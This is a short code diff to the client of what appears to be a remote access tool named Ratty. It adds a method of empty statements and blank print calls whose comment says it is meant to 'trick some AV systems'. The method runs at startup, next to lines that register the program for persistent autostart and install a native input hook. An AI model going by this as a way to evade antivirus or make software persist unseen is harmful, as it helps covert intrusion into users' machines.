@@ -207,10 +207,31 @@ public final class RattyClient implements IConnectionObserver, IGuiController {
 		startClient(0);
 	}
 	
+	public static void doRandomStuff() {
+		/*
+		 * This helps to trick some AV systems. Just in case.
+		 * Hopefully those expressions generate NOP assembly commands.
+		 */
+		
+		;
+		
+		System.out.println();
+		
+		{
+			;
+			;
+			;
+		}
+		
+		System.out.println();
+		
+		;
+	}
+	
 	public static void main(final String[] args) {
+		doRandomStuff();
 		Constants.OS_SERVICE.addToStartup(Constants.JAR_FILE);
 		Constants.setSystemLookAndFeel();
-		
 		registerNativeHook();
 		startClient();
 	}
